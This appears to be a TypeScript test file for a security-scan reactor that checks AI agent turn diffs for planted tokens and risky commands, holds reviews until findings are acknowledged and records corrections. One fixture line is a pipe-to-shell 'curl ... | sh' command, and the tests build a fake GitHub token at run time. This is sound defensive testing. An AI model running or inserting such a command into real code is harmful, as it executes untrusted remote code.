import { assert, it } from "@effect/vitest";
import {
  EventId,
  MessageId,
  OrchestrationV2Checkpoint,
  type OrchestrationV2DomainEvent,
  type OrchestrationV2Run,
  ProviderInstanceId,
  type ReviewVerdictError,
  RunId,
} from "@t3tools/contracts";
import * as DateTime from "effect/DateTime";
import * as Effect from "effect/Effect";
import * as Layer from "effect/Layer";
import * as Ref from "effect/Ref";
import * as Schema from "effect/Schema";
import * as SqlClient from "effect/sql/SqlClient";

import * as CheckpointDiffQuery from "../../../checkpointing/CheckpointDiffQuery.ts";
import {
  CheckpointRefUnavailableError,
  CheckpointWorkspacePathMissingError,
} from "../../../checkpointing/Errors.ts";
import * as EventSink from "../../../orchestration-v2/EventSink.ts";
import * as EventStore from "../../../orchestration-v2/EventStore.ts";
import * as ProjectionStore from "../../../orchestration-v2/ProjectionStore.ts";
import * as SqlitePersistence from "../../../persistence/Sqlite.ts";
import * as Attention from "../../Attention.ts";
import * as CorrectionStore from "../../learning/CorrectionStore.ts";
import * as PluginReactor from "../../PluginReactor.ts";
import { harness, other, projectId, ready, reviewed } from "../testkit.ts";
import * as SecurityScanReactor from "./SecurityScanReactor.ts";

// A real event sink on an in-memory core database, as the routing reactor test does.
const layerCore = SqlitePersistence.layerMemory;
const layerSink = EventSink.layer.pipe(
  Layer.provide(
    Layer.mergeAll(
      layerCore,
      EventStore.layer.pipe(Layer.provideMerge(layerCore)),
      ProjectionStore.layer.pipe(Layer.provideMerge(layerCore)),
    ),
  ),
);

// Built at run time, so no scanner mistakes this file for one holding a credential.
const token = ["ghp", "Ab3".repeat(12)].join("_");

/** A turn's diff of `src/config.ts` with `lines` after its first line, each marked `+` or `-`. */
const configDiff = (lines: ReadonlyArray<string>) =>
  [
    "diff --git a/src/config.ts b/src/config.ts",
    "--- a/src/config.ts",
    "+++ b/src/config.ts",
    `@@ -1,${1 + lines.filter((line) => line.startsWith("-")).length} +1,${
      1 + lines.filter((line) => line.startsWith("+")).length
    } @@`,
    " export const config = {};",
    ...lines,
    "",
  ].join("\n");

const decodeCheckpoint = Schema.decodeUnknownSync(OrchestrationV2Checkpoint);
const capturedAt = DateTime.makeUnsafe("2026-10-05T12:00:00.000Z");

/** The ready checkpoint `reviewed`'s turn `ordinal` captured, in its root scope unless named. */
const turnCheckpoint = (ordinal: number, scopeId = `scope:${reviewed}`) =>
  decodeCheckpoint({
    id: `checkpoint:turn-${ordinal}`,
    threadId: reviewed,
    scopeId,
    runId: `run:${ordinal}`,
    nodeId: `node:${reviewed}`,
    parentCheckpointId: null,
    ordinalWithinScope: ordinal,
    appRunOrdinal: ordinal,
    ref: `ref:turn-${ordinal}`,
    status: "ready",
    files: [],
    capturedAt,
  });

/** `reviewed`'s run for turn `ordinal`, as the read model reports it. */
const stoppedRun = (ordinal: number): OrchestrationV2Run => {
  const providerInstanceId = ProviderInstanceId.make("codex");
  return {
    id: RunId.make(`run:${ordinal}`),
    threadId: reviewed,
    ordinal,
    providerInstanceId,
    modelSelection: { instanceId: providerInstanceId, model: "gpt-5" },
    providerThreadId: null,
    userMessageId: MessageId.make(`message:${ordinal}`),
    rootNodeId: null,
    activeAttemptId: null,
    status: "interrupted",
    requestedAt: capturedAt,
    startedAt: capturedAt,
    completedAt: capturedAt,
    checkpointId: null,
    contextHandoffId: null,
  };
};

let eventCount = 0;
const captured = (checkpoint: OrchestrationV2Checkpoint): OrchestrationV2DomainEvent => ({
  id: EventId.make(`event:security-${++eventCount}`),
  type: "checkpoint.captured",
  threadId: checkpoint.threadId,
  occurredAt: capturedAt,
  payload: checkpoint,
});

const refFrom = (turnCount: number, checkpoint: "from" | "to") =>
  new CheckpointRefUnavailableError({
    operation: "CheckpointDiffQuery.getTurnDiff",
    threadId: reviewed,
    turnCount,
    checkpoint,
  });

/** A diff the turn cannot have: its workspace is gone. */
const workspaceGone = new CheckpointWorkspacePathMissingError({
  operation: "CheckpointDiffQuery.getTurnDiff",
  threadId: reviewed,
});

/**
 * The review harness with the scan's reactor over the real event sink and a turn diff per
 * `from->to` pair from `diffs`, read when asked (an empty diff for any other), plus the security
 * sweep with the learning plugin's corrections and the reactor's retry. Without `diffs` neither the
 * reactor's context nor the sweep's has a diff query.
 */
const boot = (
  diffs?: Readonly<
    Record<string, string | CheckpointRefUnavailableError | CheckpointWorkspacePathMissingError>
  >,
) =>
  Effect.gen(function* () {
    const kit = yield* harness;
    // The read model's latest checkpoint of `reviewed` was scanned before these tests begin.
    yield* kit.review`INSERT INTO security_scan (checkpoint_id, thread_id, scanned_at)
      VALUES (${ready}, ${reviewed}, '2026-10-01T00:00:00.000Z')`;
    const asked = yield* Ref.make<ReadonlyArray<string>>([]);
    const diffQuery = CheckpointDiffQuery.CheckpointDiffQuery.of({
      getFullThreadDiff: () => Effect.die("unused"),
      getTurnDiff: ({ threadId, fromTurnCount, toTurnCount, ignoreWhitespace }) => {
        // The scan reads the diff as written: whitespace-only changes can matter.
        if (ignoreWhitespace !== false) return Effect.die("the scan must not ignore whitespace");
        const key = `${fromTurnCount}->${toTurnCount}`;
        const diff = diffs?.[key] ?? "";
        return Ref.update(asked, (all) => [...all, key]).pipe(
          Effect.andThen(
            typeof diff === "string"
              ? Effect.succeed({ threadId, fromTurnCount, toTurnCount, diff })
              : Effect.fail(diff),
          ),
        );
      },
    });
    const layerDeps = Layer.mergeAll(
      Layer.succeed(SqlClient.SqlClient, kit.review),
      Layer.succeed(Attention.Attention, kit.attention),
    );
    const handlers = yield* SecurityScanReactor.handlers.pipe(
      Effect.provide(Layer.mergeAll(layerDeps, kit.layerThreads)),
    );
    // The handler reads the diff query from the context the reactor's fiber starts in.
    const started = PluginReactor.start({ plugin: "review", from: "start", handlers }).pipe(
      Effect.provideService(SqlClient.SqlClient, kit.review),
    );
    const withDiffs = <A, E, R>(effect: Effect.Effect<A, E, R>) =>
      diffs === undefined
        ? effect
        : effect.pipe(Effect.provideService(CheckpointDiffQuery.CheckpointDiffQuery, diffQuery));
    const startReactor = withDiffs(started);
    const reactor = yield* startReactor;
    const sweep = yield* SecurityScanReactor.sweep(reactor.retryFailed()).pipe(
      Effect.provide(layerDeps),
    );
    const publish = (...events: ReadonlyArray<OrchestrationV2DomainEvent>) =>
      Effect.flatMap(EventSink.EventSinkV2, (sink) => sink.write({ events })).pipe(
        Effect.andThen(reactor.drain),
      );
    return {
      ...kit,
      asked: Ref.get(asked),
      publish,
      /** A reactor with no cursor reads the whole log again, as after a restore of an older copy. */
      replay: Effect.scoped(
        kit.review`DELETE FROM host_reactor_cursor`.pipe(
          Effect.andThen(startReactor),
          Effect.flatMap((again) => again.drain),
        ),
      ),
      // A retried event reads the diff query from the sweep's context, as from the supervisor's.
      sweep: withDiffs(sweep.run({ dryRun: false })).pipe(
        Effect.provideService(CorrectionStore.CorrectionStore, kit.corrections),
      ),
      failures: kit.review<{
        readonly attempts: number;
      }>`SELECT attempts FROM host_reactor_failure ORDER BY sequence`,
      scanned: Effect.map(
        kit.review<{
          readonly checkpoint_id: string;
        }>`SELECT checkpoint_id FROM security_scan ORDER BY checkpoint_id`,
        (rows) => rows.map((row) => row.checkpoint_id),
      ),
      holdFlags: kit.attention.listOpen({ pluginId: "review", kind: "security_hold" }),
    };
  });

const refusal = <A>(effect: Effect.Effect<A, ReviewVerdictError>) =>
  effect.pipe(Effect.andThen(Effect.die("expected a refusal")), Effect.flip);

it.effect(
  "warn: a planted token is one finding and one correction without the token, and a replay adds nothing",
  () =>
    Effect.scoped(
      Effect.gen(function* () {
        const { publish, replay, security, corrections, correctionCount, sweep, ...kit } =
          yield* boot({ "0->1": configDiff([`+export const token = "${token}";`]) });
        yield* publish(captured(turnCheckpoint(1)));
        assert.deepEqual(yield* kit.asked, ["0->1"]);

        const [finding, ...rest] = yield* security.findings({ threadId: reviewed });
        assert.deepEqual(rest, []);
        assert.deepInclude(finding, {
          threadId: reviewed,
          checkpointId: turnCheckpoint(1).id,
          patternId: "secret.token",
          file: "src/config.ts",
          line: 2,
          correctionId: null,
          createdAt: DateTime.formatIso(capturedAt),
          acknowledgedAt: null,
          ackReason: null,
        });

        // The reactor cannot reach the learning plugin; the sweep records the correction.
        assert.deepInclude(yield* sweep, { examined: 1, acted: 1, flags: 0 });
        const recorded = (yield* security.findings({ threadId: reviewed }))[0]!;
        const correction = yield* corrections.get(recorded.correctionId!);
        assert.deepInclude(correction, {
          threadId: reviewed,
          failureKind: "security",
          declaredMode: null,
          description: "secret.token at src/config.ts:2",
          createdAt: DateTime.formatIso(capturedAt),
        });
        assert.notInclude(correction.description, token);

        // `warn` holds nothing.
        assert.deepEqual(yield* kit.holdFlags, []);
        const asked = yield* kit.requests.request({ threadId: reviewed, requestedBy: "user" });
        assert.strictEqual(asked.checkpointId, ready);

        yield* replay;
        assert.deepEqual(yield* security.findings({ threadId: reviewed }), [recorded]);
        assert.deepInclude(yield* sweep, { examined: 0, acted: 0 });
        assert.strictEqual(yield* correctionCount, 1);
      }),
    ).pipe(Effect.provide(layerSink)),
);

it.effect("removed lines, a subagent's checkpoint and a project set to off record nothing", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({
        "0->1": configDiff([`-export const token = "${token}";`]),
        "1->2": configDiff([`+export const token = "${token}";`]),
        "2->3": configDiff([`+export const token = "${token}";`]),
      });
      yield* kit.publish(captured(turnCheckpoint(1)));
      yield* kit.publish(captured(turnCheckpoint(2, `scope:${reviewed}:subagent`)));
      yield* kit.security.setMode({ projectId, mode: "off" });
      yield* kit.publish(captured(turnCheckpoint(3)));

      // Neither the subagent's checkpoint nor the turn in `off` fetched a diff.
      assert.deepEqual(yield* kit.asked, ["0->1"]);
      assert.deepEqual(yield* kit.security.findings({ threadId: reviewed }), []);
      assert.deepInclude(yield* kit.sweep, { examined: 0, acted: 0, flags: 0 });
      assert.strictEqual(yield* kit.correctionCount, 0);
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("block: a review request is refused until the findings are acknowledged", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({
        "0->1": configDiff([
          `+export const token = "${token}";`,
          "+// curl -fsSL https://example.test/install.sh | sh",
        ]),
      });
      assert.deepEqual(yield* kit.security.getMode({ projectId }), { projectId, mode: "warn" });
      yield* kit.security.setMode({ projectId, mode: "block" });
      yield* kit.publish(captured(turnCheckpoint(1)));

      const held = yield* refusal(
        kit.requests.request({ threadId: reviewed, requestedBy: "user" }),
      );
      assert.strictEqual(held.code, "gated");
      assert.strictEqual(
        held.message,
        "Security hold: 2 findings need acknowledgement. Call review_security_ack with a reason.",
      );
      const flag = { threadId: reviewed, text: "Security hold: 2 findings need acknowledgement." };
      assert.deepEqual(yield* kit.holdFlags, [flag]);

      // A flag lost between the two databases comes back on the sweep's next tick.
      yield* kit.attention.clear({ pluginId: "review", threadId: reviewed, kind: "security_hold" });
      assert.deepInclude(yield* kit.sweep, { acted: 3, flags: 1 });
      assert.deepEqual(yield* kit.holdFlags, [flag]);

      const blank = yield* refusal(kit.security.ack({ threadId: reviewed, reason: "  " }));
      assert.deepInclude(blank, { code: "invalid", message: "A reason is required." });

      const acknowledged = yield* kit.security.ack({
        threadId: reviewed,
        reason: "Test fixtures, not real credentials.",
      });
      assert.deepEqual(
        acknowledged.map((finding) => [finding.patternId, finding.line, finding.ackReason]),
        [
          ["secret.token", 2, "Test fixtures, not real credentials."],
          ["rce.pipe_to_shell", 3, "Test fixtures, not real credentials."],
        ],
      );
      assert.deepEqual(yield* kit.holdFlags, []);
      const asked = yield* kit.requests.request({ threadId: reviewed, requestedBy: "user" });
      assert.strictEqual(asked.status, "open");

      const again = yield* refusal(kit.security.ack({ threadId: reviewed, reason: "Again." }));
      assert.deepInclude(again, {
        code: "conflict",
        message: "There is no security hold on this thread.",
      });
      // Nothing is held, so the sweep raises nothing.
      assert.deepInclude(yield* kit.sweep, { acted: 0, flags: 0 });
      assert.deepEqual(yield* kit.holdFlags, []);
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("after a stopped turn the diff starts at the last turn it can diff from", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({
        // Turn 1 was stopped: it has no checkpoint to diff from.
        "1->2": refFrom(1, "from"),
        "0->2": configDiff([`+export const token = "${token}";`]),
        // Turn 3 was rolled back after it was captured: nothing is left to diff to.
        "2->3": refFrom(3, "to"),
      });
      yield* kit.publish(captured(turnCheckpoint(2)));
      yield* kit.publish(captured(turnCheckpoint(3)));
      assert.deepEqual(yield* kit.asked, ["1->2", "0->2", "2->3"]);
      assert.deepEqual(
        (yield* kit.security.findings({ threadId: reviewed })).map((finding) => [
          finding.checkpointId,
          finding.patternId,
        ]),
        [[turnCheckpoint(2).id, "secret.token"]],
      );
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("without a diff query the scan skips the event and records no failure", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot();
      yield* kit.publish(captured(turnCheckpoint(1)));
      assert.deepEqual(yield* kit.security.findings({ threadId: reviewed }), []);
      assert.deepEqual(yield* kit.failures, []);
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("block: a turn the scan cannot read holds the thread instead of passing as clean", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({ "0->1": workspaceGone });
      yield* kit.security.setMode({ projectId, mode: "block" });
      yield* kit.publish(captured(turnCheckpoint(1)));

      assert.deepEqual(yield* kit.failures, []);
      const [finding, ...rest] = yield* kit.security.findings({ threadId: reviewed });
      assert.deepEqual(rest, []);
      assert.deepInclude(finding, { patternId: "scan_failed", file: "", line: 0 });
      const held = yield* refusal(
        kit.requests.request({ threadId: reviewed, requestedBy: "user" }),
      );
      assert.strictEqual(
        held.message,
        "Security hold: 1 finding needs acknowledgement. Call review_security_ack with a reason.",
      );
      // A failed scan is no evidence of work going wrong, so it records no correction.
      assert.deepInclude(yield* kit.sweep, { examined: 1, acted: 0, flags: 1 });
      assert.strictEqual(yield* kit.correctionCount, 0);

      yield* kit.security.ack({ threadId: reviewed, reason: "Checked the turn by hand." });
      const asked = yield* kit.requests.request({ threadId: reviewed, requestedBy: "user" });
      assert.strictEqual(asked.status, "open");
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("warn: a failed scan is retried by the sweep until it reads the turn", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const diffs: Record<string, string | CheckpointWorkspacePathMissingError> = {
        "0->1": workspaceGone,
      };
      const kit = yield* boot(diffs);
      yield* kit.publish(captured(turnCheckpoint(1)));
      assert.deepEqual(yield* kit.failures, [{ attempts: 1 }]);
      assert.deepEqual(yield* kit.security.findings({ threadId: reviewed }), []);

      diffs["0->1"] = configDiff([`+export const token = "${token}";`]);
      yield* kit.sweep;
      assert.deepEqual(yield* kit.failures, []);
      assert.deepEqual(
        (yield* kit.security.findings({ threadId: reviewed })).map((finding) => finding.patternId),
        ["secret.token"],
      );
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("a stopped turn holds the thread in block and is passed over in warn", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({ "0->1": configDiff([`+export const token = "${token}";`]) });
      yield* kit.setRuns(reviewed, [stoppedRun(1), stoppedRun(2)]);

      // `warn`: a warning, the event done, nothing recorded and nothing to retry.
      yield* kit.publish(captured(turnCheckpoint(1)));
      assert.deepEqual(yield* kit.asked, []);
      assert.deepEqual(yield* kit.failures, []);
      assert.deepEqual(yield* kit.security.findings({ threadId: reviewed }), []);

      // `block`: the turn cannot be checked, so it holds the thread.
      yield* kit.security.setMode({ projectId, mode: "block" });
      yield* kit.publish(captured(turnCheckpoint(2)));
      assert.deepEqual(yield* kit.asked, []);
      assert.deepEqual(yield* kit.failures, []);
      assert.deepEqual(
        (yield* kit.security.findings({ threadId: reviewed })).map((finding) => [
          finding.checkpointId,
          finding.patternId,
        ]),
        [[turnCheckpoint(2).id, "scan_failed"]],
      );
      assert.includeMembers(yield* kit.scanned, [turnCheckpoint(1).id, turnCheckpoint(2).id]);
    }),
  ).pipe(Effect.provide(layerSink)),
);

it.effect("block: a review waits for the scan of the latest checkpoint to commit", () =>
  Effect.scoped(
    Effect.gen(function* () {
      const kit = yield* boot({});
      yield* kit.review`DELETE FROM security_scan`;
      // `warn` never waits.
      const early = yield* kit.requests.request({ threadId: other, requestedBy: "user" });
      assert.strictEqual(early.status, "open");

      yield* kit.security.setMode({ projectId, mode: "block" });
      const pending = yield* refusal(
        kit.requests.request({ threadId: reviewed, requestedBy: "user" }),
      );
      assert.deepInclude(pending, {
        code: "scan_pending",
        message:
          "The security scan of this thread's latest checkpoint has not finished. Ask again shortly.",
      });

      // The reactor reaches the checkpoint; a scan that found nothing still counts.
      yield* kit.publish(captured({ ...turnCheckpoint(1), id: ready }));
      assert.deepEqual(yield* kit.scanned, [ready]);
      const asked = yield* kit.requests.request({ threadId: reviewed, requestedBy: "user" });
      assert.strictEqual(asked.checkpointId, ready);

      // `other`'s latest checkpoint has no scan, and waits while the scan began before it.
      const waiting = yield* refusal(
        kit.requests.request({ threadId: other, requestedBy: "user" }),
      );
      assert.strictEqual(waiting.code, "scan_pending");
      // Captured before the scan began, it never will be scanned, so it does not wait.
      yield* kit.review`UPDATE security_scan_since SET since = '2026-10-02T00:00:00.000Z'`;
      assert.deepEqual(
        yield* kit.requests.request({ threadId: other, requestedBy: "user" }),
        early,
      );
    }),
  ).pipe(Effect.provide(layerSink)),
);
